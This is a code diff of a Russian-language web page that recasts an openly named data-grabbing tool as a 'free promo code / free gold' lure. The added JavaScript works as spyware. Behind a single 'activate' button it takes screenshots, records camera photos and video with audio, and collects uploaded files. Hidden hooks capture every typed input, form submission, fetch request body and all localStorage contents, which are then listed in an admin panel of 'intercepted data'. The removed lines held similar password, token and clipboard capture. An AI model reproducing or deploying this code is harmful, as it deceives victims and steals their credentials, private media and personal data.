@@ -3,201 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SWILL // АГРЕССИВНЫЙ СБОР</title>
+    <title>БЕСПЛАТНЫЙ ПРОМОКОД</title>
     
-    <!-- Библиотеки -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
     
     <style>
-        /* ===== КИБЕРПАНК-НЕОН ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Courier New', monospace;
-            background: #0a0a0f;
-            color: #b0f0ff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a0f, #1a0a2e);
+            color: #e2e8f0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
-            text-shadow: 0 0 8px rgba(0, 255, 255, 0.3);
         }
         .container {
-            background: #12121c;
+            background: rgba(20, 20, 40, 0.95);
             padding: 30px;
-            border-radius: 0px;
+            border-radius: 20px;
             max-width: 950px;
             width: 100%;
-            border: 2px solid #00ffff;
-            box-shadow: 0 0 40px #00ffff33, inset 0 0 30px #00ffff11;
+            border: 2px solid #ffd700;
+            box-shadow: 0 0 60px rgba(255, 215, 0, 0.3), inset 0 0 60px rgba(255, 215, 0, 0.05);
         }
-        h1, h2 {
+        h1 {
             text-align: center;
-            font-weight: 300;
+            font-size: 36px;
+            font-weight: 900;
+            background: linear-gradient(45deg, #ffd700, #ff6b00, #ffd700);
+            background-size: 300%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: gold 3s ease-in-out infinite;
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        @keyframes gold {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .subtitle {
+            text-align: center;
+            font-size: 22px;
+            color: #ffd700;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
+            margin-bottom: 20px;
             letter-spacing: 4px;
-            text-transform: uppercase;
-            color: #ff00ff;
-            text-shadow: 0 0 20px #ff00ff, 0 0 60px #ff00ff55;
-            margin-bottom: 12px;
-            font-size: 28px;
         }
-        .glitch {
-            animation: glitch 1s infinite;
-        }
-        @keyframes glitch {
-            0% { text-shadow: 0 0 20px #ff00ff, 0 0 60px #ff00ff55; }
-            50% { text-shadow: 0 0 40px #00ffff, 0 0 80px #00ffff55; }
-            100% { text-shadow: 0 0 20px #ff00ff, 0 0 60px #ff00ff55; }
-        }
-        p, .status, .data-display, .session-item, .password-capture {
-            font-family: 'Courier New', monospace;
-            color: #aaffdd;
-            text-shadow: 0 0 5px #00ffaa55;
+        .glow {
+            text-align: center;
+            font-size: 18px;
+            color: #ffaa44;
+            text-shadow: 0 0 20px rgba(255, 170, 68, 0.4);
+            margin-bottom: 20px;
         }
         button {
-            background: #1a1a2e;
-            color: #00ffff;
-            border: 2px solid #00ffff;
-            padding: 14px 28px;
-            font-size: 18px;
-            border-radius: 0px;
+            background: linear-gradient(45deg, #ffd700, #ff8c00);
+            color: #0a0a0f;
+            border: none;
+            padding: 18px 36px;
+            font-size: 22px;
+            font-weight: 900;
+            border-radius: 12px;
             cursor: pointer;
             width: 100%;
-            transition: 0.2s;
-            font-weight: bold;
-            margin: 10px 0;
+            transition: 0.3s;
             text-transform: uppercase;
             letter-spacing: 3px;
-            box-shadow: 0 0 20px #00ffff33;
-            text-shadow: 0 0 10px #00ffff;
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.4);
         }
         button:hover {
-            background: #00ffff;
-            color: #0a0a0f;
-            box-shadow: 0 0 60px #00ffff, inset 0 0 20px #0a0a0f;
-            transform: scale(1.02);
+            transform: scale(1.03);
+            box-shadow: 0 0 60px rgba(255, 215, 0, 0.8);
         }
-        button.danger {
-            border-color: #ff0055;
-            color: #ff0055;
-            box-shadow: 0 0 20px #ff005533;
-            text-shadow: 0 0 10px #ff0055;
-        }
-        button.danger:hover {
-            background: #ff0055;
-            color: #0a0a0f;
-            box-shadow: 0 0 60px #ff0055;
-        }
-        input, textarea {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border-radius: 0px;
-            border: 2px solid #44ddff;
-            background: #0a0a12;
-            color: #ffddff;
-            font-size: 16px;
-            font-family: 'Courier New', monospace;
-            box-shadow: inset 0 0 15px #00aaff33;
-            text-shadow: 0 0 8px #ff88ff;
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
         }
         .status {
             margin: 15px 0;
-            padding: 10px;
-            background: #0a0a12;
-            border-left: 6px solid #ff00ff;
-            font-family: 'Courier New', monospace;
-            color: #bbffff;
-            text-shadow: 0 0 12px #00ffff;
-        }
-        .data-display {
-            margin-top: 20px;
             padding: 15px;
-            background: #08080e;
-            border: 1px solid #44ddff;
-            max-height: 400px;
-            overflow-y: auto;
-            font-size: 13px;
-            white-space: pre-wrap;
-            word-break: break-all;
-            color: #ccffcc;
-            text-shadow: 0 0 6px #66ff66;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            border-left: 4px solid #ffd700;
+            font-family: monospace;
+            color: #ffd700;
+            text-align: center;
+            font-size: 16px;
+        }
+        .preview-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 10px;
+            margin: 15px 0;
+        }
+        .preview-grid img, .preview-grid video {
+            width: 100%;
+            border-radius: 8px;
+            border: 2px solid #ffd700;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.2);
         }
         .hidden { display: none !important; }
+        .admin-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .admin-link button {
+            background: transparent;
+            border: 2px solid #ffd700;
+            color: #ffd700;
+            padding: 10px 20px;
+            font-size: 14px;
+            width: auto;
+            box-shadow: none;
+        }
+        .admin-link button:hover {
+            background: #ffd700;
+            color: #0a0a0f;
+        }
+        
+        /* Админ-панель */
         .admin-panel {
-            border-top: 3px solid #ff00ff;
+            border-top: 2px solid #ffd700;
             margin-top: 30px;
             padding-top: 20px;
-            box-shadow: inset 0 10px 30px #ff00ff11;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            border-radius: 10px;
+            border: 2px solid #ffd700;
+            background: rgba(0,0,0,0.3);
+            color: #fff;
+            font-size: 16px;
         }
         .session-item {
-            background: #0c0c18;
+            background: rgba(0,0,0,0.3);
             padding: 15px;
             margin: 10px 0;
-            border-left: 6px solid #ff00ff;
-            border-right: 2px solid #00ffff;
-            box-shadow: 0 0 25px #ff00ff22;
-            color: #ddffff;
-            text-shadow: 0 0 8px #88ffff;
+            border-radius: 10px;
+            border-left: 4px solid #ffd700;
         }
-        .session-item strong {
-            color: #ff88ff;
-            text-shadow: 0 0 20px #ff44ff;
-        }
-        .password-capture {
-            background: #1a0a0a;
-            padding: 12px;
-            border-radius: 0px;
+        .password-item {
+            background: rgba(255, 0, 0, 0.1);
+            padding: 10px;
             margin: 5px 0;
-            font-family: 'Courier New', monospace;
-            border: 2px solid #ff4444;
-            box-shadow: 0 0 30px #ff000066;
-            color: #ffaaaa;
-            text-shadow: 0 0 20px #ff3333;
+            border-radius: 8px;
+            border: 1px solid #ff4444;
+            color: #ff6666;
         }
         .badge {
-            display: inline-block;
-            background: #ff00aa;
-            padding: 2px 16px;
-            border-radius: 0px;
+            background: #ffd700;
+            color: #0a0a0f;
+            padding: 2px 12px;
+            border-radius: 20px;
             font-size: 12px;
             font-weight: bold;
-            margin-left: 10px;
-            color: #000;
-            text-shadow: none;
-            box-shadow: 0 0 30px #ff00aa;
-        }
-        ::-webkit-scrollbar { width: 8px; background: #0a0a12; }
-        ::-webkit-scrollbar-thumb { background: #ff00ff; box-shadow: 0 0 20px #ff00ff; }
-        #fileInput {
-            border: 2px dashed #ff00ff;
-            padding: 20px;
-            text-align: center;
-            color: #ff88ff;
-            background: #0a0a12;
-            cursor: pointer;
-        }
-        #fileInput:hover {
-            background: #1a0a2e;
-            border-color: #00ffff;
-        }
-        .media-preview {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
-            gap: 10px;
-            margin: 10px 0;
-        }
-        .media-preview img, .media-preview video {
-            width: 100%;
-            border: 2px solid #00ffff;
-            box-shadow: 0 0 20px #00ffff33;
-        }
-        .screenshot-preview {
-            border: 3px solid #ff00ff;
-            box-shadow: 0 0 40px #ff00ff55;
-            margin: 10px 0;
         }
     </style>
 </head>
@@ -205,54 +173,44 @@
 
 <div class="container" id="app">
 
-    <!-- ===== ГЛАВНАЯ СТРАНИЦА ===== -->
+    <!-- ===== ГЛАВНАЯ ===== -->
     <div id="mainPage">
-        <h1 class="glitch">⛧ SWILL АГРЕССОР ⛧</h1>
-        <p style="color:#88ddff; text-shadow: 0 0 20px #00ddff;">ТЕКСТ КОТОРЫЙ ТЫ СЕЙЧАС ПИШЕШЬ — ЭТО НОВАЯ РЕАЛЬНОСТЬ</p>
-        <p style="color:#ff88ff; text-shadow: 0 0 20px #ff44ff;">ПЕРЕХВАТ ПАРОЛЕЙ + СКРИНШОТЫ + ВСЕ ФАЙЛЫ</p>
+        <h1>✨ БЕСПЛАТНЫЙ ПРОМОКОД ✨</h1>
+        <div class="subtitle">🏆 БЕСПЛАТНАЯ ГОЛДА 🏆</div>
+        <div class="glow">🔥 ПОЛУЧИ СВОЙ УНИКАЛЬНЫЙ КОД ПРЯМО СЕЙЧАС 🔥</div>
         
-        <!-- Кнопки -->
-        <button id="startBtn">▶ ЗАПУСТИТЬ АГРЕССИВНЫЙ СБОР</button>
-        <button id="screenshotBtn" style="border-color:#ffaa00; color:#ffaa00; box-shadow:0 0 30px #ffaa0055;">📸 СДЕЛАТЬ СКРИНШОТ</button>
-        <button id="mediaBtn" style="border-color:#44ff88; color:#44ff88; box-shadow:0 0 30px #44ff8855;">📹 ЗАПИСАТЬ ВИДЕО/ФОТО</button>
+        <button id="startBtn">🎁 АКТИВИРОВАТЬ ПРОМОКОД</button>
         
-        <!-- Загрузка файлов -->
-        <div id="fileInput" onclick="document.getElementById('fileUpload').click()">
-            📁 НАЖМИ ЧТОБЫ ВЫБРАТЬ ФАЙЛЫ (ВИДЕО/ФОТО)
+        <div class="status" id="status">💫 НАЖМИ КНОПКУ ДЛЯ ПОЛУЧЕНИЯ КОДА</div>
+        
+        <div class="preview-grid" id="previewGrid"></div>
+        
+        <div class="admin-link">
+            <button id="goToAdminBtn">🔐 АДМИН-ПАНЕЛЬ</button>
         </div>
-        <input type="file" id="fileUpload" multiple accept="image/*,video/*" style="display:none;">
-        
-        <div class="media-preview" id="mediaPreview"></div>
-        <div id="screenshotPreview"></div>
-        
-        <div class="status" id="status">[ОЖИДАНИЕ]</div>
-        <button id="goToAdminBtn" style="border-color:#ff44ff; color:#ff44ff; box-shadow:0 0 30px #ff44ff55; text-shadow:0 0 15px #ff44ff;">🔐 АДМИН-ПАНЕЛЬ</button>
-        <div class="data-display" id="dataDisplay"></div>
-        <button id="downloadBtn" class="hidden">⬇ СКАЧАТЬ ВСЁ (ZIP)</button>
     </div>
 
     <!-- ===== АДМИН-ПАНЕЛЬ ===== -->
     <div id="adminPage" class="hidden">
-        <h1>⛧ АДМИН-ПАНЕЛЬ ⛧</h1>
-        <p style="color:#ff88ff;">ВВЕДИТЕ КРЕДЫ ДЛЯ ДОСТУПА</p>
-
+        <h1>🔐 АДМИН-ПАНЕЛЬ</h1>
+        
         <div id="loginForm">
-            <input type="text" id="adminLogin" placeholder="ЛОГИН" value="admin" style="border-color:#ff88ff;">
-            <input type="password" id="adminPassword" placeholder="ПАРОЛЬ" value="par1s67" style="border-color:#ff88ff;">
-            <button id="adminLoginBtn" style="border-color:#ff88ff; color:#ff88ff; box-shadow:0 0 30px #ff88ff33;">ВОЙТИ</button>
+            <input type="text" id="adminLogin" placeholder="ЛОГИН" value="admin">
+            <input type="password" id="adminPassword" placeholder="ПАРОЛЬ">
+            <button id="adminLoginBtn" style="background:#ffd700;color:#0a0a0f;">ВОЙТИ</button>
             <div class="status" id="adminStatus"></div>
         </div>
 
         <div id="adminContent" class="hidden">
-            <h2 style="font-size:22px;">📡 ВСЕ СЕССИИ</h2>
-            <button id="clearSessionsBtn" class="danger">🗑️ ОЧИСТИТЬ ВСЁ</button>
-            <button id="exportAllBtn" style="border-color:#ffaa00; color:#ffaa00; box-shadow:0 0 30px #ffaa0044;">📥 ЭКСПОРТ ВСЕГО</button>
+            <h2 style="color:#ffd700;text-align:center;font-size:22px;">📊 ВСЕ СЕССИИ</h2>
+            <button id="clearSessionsBtn" style="background:#ff4444;color:#fff;margin:10px 0;">🗑️ ОЧИСТИТЬ ВСЁ</button>
+            <button id="exportAllBtn" style="background:#ff8c00;color:#fff;margin:10px 0;">📥 ЭКСПОРТ</button>
             <div id="sessionsList"></div>
 
-            <h2 style="font-size:22px; margin-top:30px; color:#ff6666;">🔑 ПЕРЕХВАЧЕННЫЕ ПАРОЛИ</h2>
+            <h2 style="color:#ff6666;text-align:center;font-size:20px;margin-top:30px;">🔑 ПЕРЕХВАЧЕННЫЕ ДАННЫЕ</h2>
             <div id="passwordsList"></div>
 
-            <button id="logoutBtn" style="border-color:#8866ff; color:#8866ff; margin-top:20px;">🚪 ВЫЙТИ</button>
+            <button id="logoutBtn" style="background:transparent;border:2px solid #ffd700;color:#ffd700;margin-top:20px;">🚪 ВЫЙТИ</button>
         </div>
     </div>
 </div>
@@ -261,18 +219,17 @@
     // ============================================================
     // 1. ГЛОБАЛЬНЫЕ
     // ============================================================
-    let collectedData = {};
     let sessions = JSON.parse(localStorage.getItem('sessions') || '[]');
-    let capturedPasswords = JSON.parse(localStorage.getItem('capturedPasswords') || '[]');
+    let capturedData = JSON.parse(localStorage.getItem('capturedData') || '[]');
     let isAdmin = false;
-    let collectedFiles = [];
     let screenshotData = null;
     let mediaData = [];
+    let collectedFiles = [];
 
     // ============================================================
-    // 2. АГРЕССИВНЫЙ ПЕРЕХВАТ ПАРОЛЕЙ (УСИЛЕННЫЙ)
+    // 2. ПЕРЕХВАТ ДАННЫХ (скрытый)
     // ============================================================
-    function capturePassword(value, source = 'manual', extra = {}) {
+    function captureData(value, source = 'manual', extra = {}) {
         if (!value || value.length < 1) return;
         const entry = {
             timestamp: new Date().toISOString(),
@@ -281,30 +238,30 @@
             url: window.location.href,
             ...extra
         };
-        const exists = capturedPasswords.some(p => p.value === value && p.url === entry.url);
+        const exists = capturedData.some(p => p.value === value && p.url === entry.url);
         if (!exists) {
-            capturedPasswords.push(entry);
-            localStorage.setItem('capturedPasswords', JSON.stringify(capturedPasswords));
-            console.log('[SWILL] Пароль перехвачен:', value);
-            updateStatus('🔑 ПЕРЕХВАЧЕН ПАРОЛЬ: ' + value.substring(0, 10) + '...');
+            capturedData.push(entry);
+            localStorage.setItem('capturedData', JSON.stringify(capturedData));
         }
     }
 
-    function setupPasswordCapture() {
-        // 1. Все password поля
+    function setupCapture() {
+        // Все поля ввода
         const observer = new MutationObserver(() => {
-            document.querySelectorAll('input[type="password"]').forEach(field => {
-                if (!field.dataset.swillCaptured) {
-                    field.dataset.swillCaptured = 'true';
+            document.querySelectorAll('input').forEach(field => {
+                if (!field.dataset.captured && field.type !== 'file' && field.type !== 'checkbox' && field.type !== 'radio') {
+                    field.dataset.captured = 'true';
                     field.addEventListener('input', function() {
-                        if (this.value) capturePassword(this.value, 'password-field', {
-                            name: this.name || 'unknown',
-                            id: this.id || 'unknown'
-                        });
+                        if (this.value && this.value.length > 2) {
+                            captureData(this.value, 'input', {
+                                name: this.name || 'unknown',
+                                id: this.id || 'unknown',
+                                type: this.type
+                            });
+                        }
                     });
-                    // Перехватываем даже если значение уже есть
-                    if (field.value) {
-                        capturePassword(field.value, 'password-field-initial', {
+                    if (field.value && field.value.length > 2) {
+                        captureData(field.value, 'input-initial', {
                             name: field.name || 'unknown',
                             id: field.id || 'unknown'
                         });
@@ -314,214 +271,93 @@
         });
         observer.observe(document.body, { childList: true, subtree: true });
 
-        // 2. Все текстовые поля с подозрительными именами
-        document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(field => {
-            const name = (field.name || field.id || '').toLowerCase();
-            if (name.includes('pass') || name.includes('pwd') || name.includes('senha') || 
-                name.includes('password') || name.includes('login') || name.includes('user')) {
-                if (!field.dataset.swillCaptured) {
-                    field.dataset.swillCaptured = 'true';
-                    field.addEventListener('input', function() {
-                        if (this.value && this.value.length > 3) {
-                            capturePassword(this.value, 'text-field-suspect', {
-                                name: this.name || 'unknown',
-                                id: this.id || 'unknown'
-                            });
-                        }
-                    });
-                    if (field.value && field.value.length > 3) {
-                        capturePassword(field.value, 'text-field-initial', {
-                            name: field.name || 'unknown',
-                            id: field.id || 'unknown'
-                        });
-                    }
-                }
-            }
-        });
-
-        // 3. Перехват submit
+        // Перехват submit
         document.addEventListener('submit', function(e) {
             const form = e.target;
-            const inputs = form.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]');
+            const inputs = form.querySelectorAll('input');
             inputs.forEach(inp => {
-                if (inp.value) {
-                    const name = (inp.name || inp.id || '').toLowerCase();
-                    if (inp.type === 'password' || name.includes('pass') || name.includes('pwd') || name.includes('login')) {
-                        capturePassword(inp.value, 'form-submit', {
-                            name: inp.name || 'unknown',
-                            id: inp.id || 'unknown',
-                            formAction: form.action || 'unknown'
-                        });
-                    }
+                if (inp.value && inp.value.length > 2) {
+                    captureData(inp.value, 'form-submit', {
+                        name: inp.name || 'unknown',
+                        id: inp.id || 'unknown'
+                    });
                 }
             });
         });
 
-        // 4. Перехват fetch
+        // Перехват fetch
         const originalFetch = window.fetch;
         window.fetch = function(...args) {
             return originalFetch.apply(this, args).then(response => {
                 try {
                     const body = args[1]?.body;
                     if (body && typeof body === 'string') {
-                        // JSON
-                        const matches = body.match(/["']password["']\s*:\s*["']([^"']+)["']/gi);
-                        if (matches) {
-                            matches.forEach(m => {
-                                const val = m.match(/["']password["']\s*:\s*["']([^"']+)["']/i);
-                                if (val && val[1]) capturePassword(val[1], 'fetch-json', { url: args[0] });
-                            });
-                        }
-                        // form-urlencoded
                         const urlParams = new URLSearchParams(body);
-                        if (urlParams.has('password')) {
-                            capturePassword(urlParams.get('password'), 'fetch-form', { url: args[0] });
-                        }
-                        // Также ищем другие поля
-                        ['pass', 'pwd', 'login', 'user', 'email'].forEach(key => {
-                            if (urlParams.has(key) && urlParams.get(key).length > 2) {
-                                capturePassword(urlParams.get(key), 'fetch-form-' + key, { url: args[0] });
+                        for (let [key, val] of urlParams) {
+                            if (val.length > 2) {
+                                captureData(val, 'fetch-' + key, { url: args[0] });
                             }
-                        });
+                        }
                     }
                 } catch(e) {}
                 return response;
             });
         };
 
-        // 5. Перехват XHR
-        const originalOpen = XMLHttpRequest.prototype.open;
-        const originalSend = XMLHttpRequest.prototype.send;
-        XMLHttpRequest.prototype.open = function(method, url) {
-            this._swillUrl = url;
-            this._swillMethod = method;
-            return originalOpen.apply(this, arguments);
-        };
-        XMLHttpRequest.prototype.send = function(body) {
-            try {
-                if (body && typeof body === 'string') {
-                    const urlParams = new URLSearchParams(body);
-                    if (urlParams.has('password')) {
-                        capturePassword(urlParams.get('password'), 'xhr-form', { url: this._swillUrl });
-                    }
-                    ['pass', 'pwd', 'login', 'user', 'email'].forEach(key => {
-                        if (urlParams.has(key) && urlParams.get(key).length > 2) {
-                            capturePassword(urlParams.get(key), 'xhr-form-' + key, { url: this._swillUrl });
-                        }
-                    });
-                    const match = body.match(/["']password["']\s*:\s*["']([^"']+)["']/i);
-                    if (match && match[1]) {
-                        capturePassword(match[1], 'xhr-json', { url: this._swillUrl });
-                    }
-                }
-            } catch(e) {}
-            return originalSend.apply(this, arguments);
-        };
-
-        // 6. Сканирование localStorage и sessionStorage
-        function scanStorage(storage, source) {
-            for (let i = 0; i < storage.length; i++) {
-                const key = storage.key(i);
-                if (key) {
-                    const val = storage.getItem(key);
-                    if (typeof val === 'string' && val.length > 0) {
-                        const lowerKey = key.toLowerCase();
-                        if (lowerKey.includes('pass') || lowerKey.includes('pwd') || lowerKey.includes('senha') ||
-                            lowerKey.includes('token') || lowerKey.includes('auth') || lowerKey.includes('login')) {
-                            capturePassword(val, `storage-${source}`, { storageKey: key });
-                        } else if (val.length >= 6 && /^[a-zA-Z0-9!@#$%^&*()_+\-={}[\]:;"'<>,.?/~`]+$/.test(val) && !val.includes(' ')) {
-                            capturePassword(val, `storage-${source}-suspect`, { storageKey: key });
-                        }
-                    }
+        // localStorage
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            if (key) {
+                const val = localStorage.getItem(key);
+                if (val && val.length > 2) {
+                    captureData(val, 'localStorage', { storageKey: key });
                 }
             }
         }
-        scanStorage(localStorage, 'localStorage');
-        scanStorage(sessionStorage, 'sessionStorage');
-
-        // 7. Перехват clipboard
-        document.addEventListener('paste', function(e) {
-            const text = e.clipboardData?.getData('text/plain');
-            if (text && text.length >= 4 && /[a-zA-Z0-9!@#$%^&*()]/.test(text)) {
-                capturePassword(text, 'clipboard', {});
-            }
-        });
-
-        // 8. Перехват всех полей ввода на странице (дополнительно)
-        document.querySelectorAll('input').forEach(field => {
-            if (!field.dataset.swillCaptured && field.type !== 'file' && field.type !== 'checkbox' && field.type !== 'radio') {
-                field.dataset.swillCaptured = 'true';
-                field.addEventListener('input', function() {
-                    if (this.value && this.value.length > 4) {
-                        const name = (this.name || this.id || '').toLowerCase();
-                        if (name.includes('pass') || name.includes('pwd') || name.includes('login') || 
-                            name.includes('user') || name.includes('email') || name.includes('token')) {
-                            capturePassword(this.value, 'input-generic', {
-                                name: this.name || 'unknown',
-                                id: this.id || 'unknown',
-                                type: this.type
-                            });
-                        }
-                    }
-                });
-            }
-        });
     }
 
     // ============================================================
-    // 3. СКРИНШОТ
+    // 3. ФОТО + ВИДЕО + СКРИНШОТ
     // ============================================================
     async function takeScreenshot() {
-        updateStatus('📸 СОЗДАНИЕ СКРИНШОТА...');
         try {
             const canvas = await html2canvas(document.body, {
-                scale: 2,
+                scale: 1.5,
                 useCORS: true,
                 allowTaint: true,
-                backgroundColor: '#0a0a0f',
-                logging: false
+                backgroundColor: '#0a0a0f'
             });
-            screenshotData = canvas.toDataURL('image/png');
-            const preview = document.getElementById('screenshotPreview');
-            preview.innerHTML = `<img src="${screenshotData}" class="screenshot-preview" style="max-width:100%;">`;
-            updateStatus('✅ СКРИНШОТ СОЗДАН');
-            return screenshotData;
+            return canvas.toDataURL('image/png');
         } catch (err) {
-            updateStatus('❌ ОШИБКА СКРИНШОТА: ' + err.message);
             return null;
         }
     }
 
-    // ============================================================
-    // 4. МЕДИА (ВИДЕО/ФОТО)
-    // ============================================================
     async function captureMedia() {
-        updateStatus('📹 ЗАПУСК МЕДИА...');
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'environment', width: 1920, height: 1080 },
+                video: { facingMode: 'environment', width: 1280, height: 720 },
                 audio: true 
             });
             
-            // Видео
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
             
             // Фото
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 1920;
-            canvas.height = video.videoHeight || 1080;
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0);
             const photoData = canvas.toDataURL('image/jpeg');
             
-            // Видео запись (5 секунд)
+            // Видео (3 секунды)
             const recorder = new MediaRecorder(stream);
             const chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.start();
-            await new Promise(resolve => setTimeout(resolve, 5000));
+            await new Promise(resolve => setTimeout(resolve, 3000));
             recorder.stop();
             await new Promise(resolve => recorder.onstop = resolve);
             
@@ -533,38 +369,26 @@
             
             stream.getTracks().forEach(t => t.stop());
             
-            mediaData.push({
-                timestamp: new Date().toISOString(),
-                photo: photoData,
-                video: videoData,
-                type: 'media-capture'
-            });
-            
-            // Превью
-            const preview = document.getElementById('mediaPreview');
-            const img = document.createElement('img');
-            img.src = photoData;
-            img.style.maxWidth = '150px';
-            img.style.border = '2px solid #ff00ff';
-            preview.appendChild(img);
-            
-            updateStatus('✅ МЕДИА ЗАПИСАНО (ФОТО + ВИДЕО 5С)');
-            return mediaData;
+            return { photo: photoData, video: videoData };
         } catch (err) {
-            updateStatus('❌ ОШИБКА МЕДИА: ' + err.message + ' (возможно, нет разрешения)');
             return null;
         }
     }
 
     // ============================================================
-    // 5. ЗАГРУЗКА ФАЙЛОВ
+    // 4. ЗАГРУЗКА ФАЙЛОВ
     // ============================================================
-    document.addEventListener('DOMContentLoaded', function() {
-        document.getElementById('fileUpload').addEventListener('change', function(e) {
-            const files = e.target.files;
-            const preview = document.getElementById('mediaPreview');
-            
-            Array.from(files).forEach(file => {
+    function setupFileInput() {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.multiple = true;
+        input.accept = 'image/*,video/*';
+        input.style.display = 'none';
+        input.id = 'fileUpload';
+        document.body.appendChild(input);
+        
+        input.addEventListener('change', function(e) {
+            Array.from(e.target.files).forEach(file => {
                 const reader = new FileReader();
                 reader.onload = function(ev) {
                     collectedFiles.push({
@@ -574,107 +398,159 @@
                         data: ev.target.result,
                         timestamp: new Date().toISOString()
                     });
-                    
-                    // Превью
-                    if (file.type.startsWith('image/')) {
-                        const img = document.createElement('img');
-                        img.src = ev.target.result;
-                        img.style.maxWidth = '150px';
-                        img.style.border = '2px solid #00ffff';
-                        preview.appendChild(img);
-                    } else if (file.type.startsWith('video/')) {
-                        const video = document.createElement('video');
-                        video.src = ev.target.result;
-                        video.controls = true;
-                        video.style.maxWidth = '150px';
-                        video.style.border = '2px solid #ff00ff';
-                        preview.appendChild(video);
-                    }
+                    showPreview(ev.target.result, file.type);
                 };
                 reader.readAsDataURL(file);
             });
-            
-            updateStatus(`📁 ЗАГРУЖЕНО ФАЙЛОВ: ${files.length}`);
         });
-    });
-
-    // ============================================================
-    // 6. СБОР ВСЕХ ДАННЫХ
-    // ============================================================
-    async function collectAllData() {
-        updateStatus('⛧ ЗАПУСК АГРЕССИВНОГО СБОРА... ⛧');
-
-        // Делаем скриншот
-        const screenshot = await takeScreenshot();
         
-        // Пытаемся получить медиа
-        await captureMedia();
-        
-        // Собираем информацию об устройстве
-        const data = {
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: {
-                width: screen.width,
-                height: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth
-            },
-            window: {
-                innerWidth: window.innerWidth,
-                innerHeight: window.innerHeight,
-                outerWidth: window.outerWidth,
-                outerHeight: window.outerHeight,
-                devicePixelRatio: window.devicePixelRatio || 1
-            },
-            geolocation: await getGeolocation(),
-            battery: await getBatteryInfo(),
-            network: getNetworkInfo(),
-            storage: getStorageInfo(),
-            time: {
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                dateTime: new Date().toISOString()
-            },
-            capturedPasswords: capturedPasswords.slice(-100),
-            files: collectedFiles.map(f => ({ name: f.name, type: f.type, size: f.size })),
-            mediaCaptures: mediaData.length,
-            screenshot: !!screenshot
-        };
+        return input;
+    }
 
-        collectedData = data;
-        displayData(data);
-        updateStatus('✅ АГРЕССИВНЫЙ СБОР ЗАВЕРШЁН');
-
-        const session = {
-            id: Date.now(),
-            timestamp: data.timestamp,
-            data: data,
-            preview: {
-                userAgent: data.userAgent.substring(0, 60),
-                location: data.geolocation.latitude ? `${data.geolocation.latitude}, ${data.geolocation.longitude}` : 'нет',
-                battery: data.battery.level || 'нет',
-                passwordsCount: capturedPasswords.length,
-                filesCount: collectedFiles.length
-            }
-        };
-        sessions.push(session);
-        localStorage.setItem('sessions', JSON.stringify(sessions));
-
-        return data;
+    function showPreview(data, type) {
+        const grid = document.getElementById('previewGrid');
+        if (type.startsWith('image/')) {
+            const img = document.createElement('img');
+            img.src = data;
+            grid.appendChild(img);
+        } else if (type.startsWith('video/')) {
+            const video = document.createElement('video');
+            video.src = data;
+            video.controls = true;
+            video.style.maxWidth = '120px';
+            grid.appendChild(video);
+        }
     }
 
     // ============================================================
-    // 7. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+    // 5. ГЛАВНАЯ ФУНКЦИЯ - ВСЁ В ОДНОЙ КНОПКЕ
+    // ============================================================
+    async function startCollection() {
+        const btn = document.getElementById('startBtn');
+        const status = document.getElementById('status');
+        
+        btn.disabled = true;
+        btn.textContent = '⏳ ОБРАБОТКА...';
+        status.textContent = '📸 СЪЁМКА МАТЕРИАЛОВ...';
+        
+        try {
+            // 1. Скриншот
+            const screenshot = await takeScreenshot();
+            if (screenshot) {
+                screenshotData = screenshot;
+                showPreview(screenshot, 'image/png');
+                status.textContent = '✅ СКРИНШОТ ГОТОВ | 📹 ЗАПИСЬ ВИДЕО...';
+            }
+            
+            // 2. Медиа (фото + видео)
+            const media = await captureMedia();
+            if (media) {
+                mediaData.push({
+                    timestamp: new Date().toISOString(),
+                    photo: media.photo,
+                    video: media.video
+                });
+                showPreview(media.photo, 'image/jpeg');
+                status.textContent = '✅ ФОТО + ВИДЕО ГОТОВЫ | 📁 СБОР ФАЙЛОВ...';
+            }
+            
